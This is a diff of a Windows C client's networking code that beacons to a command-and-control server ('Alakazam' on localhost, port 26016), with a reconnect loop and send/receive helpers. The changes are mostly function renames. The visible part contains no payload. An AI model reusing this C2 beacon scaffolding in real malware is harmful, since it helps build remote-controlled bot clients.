@@ -1,5 +1,3 @@
-#define _WIN32_WINNT 0x501
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
@@ -8,9 +6,11 @@
 #define CNC_HOST "127.0.0.1"
 #define CNC_PORT "26016"
 
+#define RETRY_INTERVAL 15
+
 SOCKET *cnc = NULL;
 
-void initwinsock() {
+void init_winsock() {
   int res;
   WSADATA wsaData;
   res = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -20,7 +20,7 @@ void initwinsock() {
   }
 }
 
-struct addrinfo getcncinfo() {
+struct addrinfo get_cnc_info() {
   int res;
   struct addrinfo *result = NULL, hints = {.ai_family = AF_UNSPEC,
                                            .ai_socktype = SOCK_STREAM,
@@ -34,8 +34,8 @@ struct addrinfo getcncinfo() {
   return *result;
 }
 
-void initcncsock() {
-  struct addrinfo cncinfo = getcncinfo();
+void init_cnc_sock() {
+  struct addrinfo cncinfo = get_cnc_info();
   SOCKET *conn = malloc(sizeof(SOCKET));
   *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
   if (*conn == INVALID_SOCKET) {
@@ -48,16 +48,15 @@ void initcncsock() {
   }
 }
 
-void connectcnc() {
-  int retry_interval = 15;
-  struct addrinfo cncinfo = getcncinfo();
+void connect_to_cnc() {
+  struct addrinfo cncinfo = get_cnc_info();
   int res = connect(*cnc, cncinfo.ai_addr, cncinfo.ai_addrlen);
   if (res == SOCKET_ERROR) {
     int err_code = WSAGetLastError();
     if (err_code == WSAECONNREFUSED) {
-      printf("Alakazam is down, retrying in %d seconds.\n", retry_interval);
-      Sleep(retry_interval * 1000);
-      connectcnc();
+      printf("Alakazam is down, retrying in %d seconds.\n", RETRY_INTERVAL);
+      Sleep(RETRY_INTERVAL * 1000);
+      connect_to_cnc();
     } else {
       printf("Unable to connect to CNC: %d\n", WSAGetLastError());
       WSACleanup();
@@ -66,13 +65,13 @@ void connectcnc() {
   }
 }
 
-void startclient() {
-  initwinsock();
-  initcncsock();
-  connectcnc();
+void start_client() {
+  init_winsock();
+  init_cnc_sock();
+  connect_to_cnc();
 }
 
-void sendtocnc(char *buf) {
+void send_to_cnc(char *buf) {
   int res = send(*cnc, buf, strlen(buf), 0);
   if (res == SOCKET_ERROR) {
     printf("Failed sending to CNC: %d\n", WSAGetLastError());
@@ -80,7 +79,7 @@ void sendtocnc(char *buf) {
   }
 }
 
-char *recvfromcnc(int bufsize) {
+char *recv_from_cnc(int bufsize) {
   char *buf = malloc(bufsize + 1);
   int bytesread = recv(*cnc, buf, bufsize, 0);
   buf[bytesread] = '\0';
